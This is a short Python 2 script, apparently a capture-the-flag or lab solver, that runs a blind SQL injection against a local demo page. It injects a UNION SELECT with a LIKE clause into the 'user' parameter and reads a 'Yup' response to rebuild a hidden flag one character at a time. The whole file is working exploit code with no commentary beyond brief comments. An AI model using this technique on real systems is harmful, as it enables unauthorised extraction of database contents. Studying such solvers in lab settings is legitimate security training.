import requests

url = 'http://localhost/demo/sql-brute.php'
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ !{}1234567890;?"
query = "MM' UNION SELECT flag, 1, 1 FROM brute WHERE flag LIKE '%"
queryEnd = "%' COLLATE latin1_general_cs #"

# Test each character in chars to see if it is in flag. Speeds up execution ALOT
charsInFlag = [];
for c in chars:
	payload = {'user': query + c + queryEnd}		
	r = requests.get(url, params=payload)
	if "Yup" in r.text:
		charsInFlag.append(c)
		print charsInFlag

print "Final Char Set: ", charsInFlag
print "Reduced test space by: %d" % (len(chars) - len(charsInFlag))

found = True
test = ""
flag = ""

# Loop over, testing possible strings until flag is found
while found:
	found = False
	
	for c in charsInFlag:
		# Test appending char to flag
		test = flag + c
		payload = {'user': query + test + queryEnd}		
		r = requests.get(url, params=payload)
		if "Yup" in r.text:
			flag = flag + c
			found = True  # Keep going
			print flag

		# Test prepending char to flag
		test = c + flag
		payload = {'user': query + test + queryEnd}		
		r = requests.get(url, params=payload)
		if "Yup" in r.text:
			flag = c + flag
			found = True # Keep going
			print flag
print "Found final flag: %s" % flag
		
		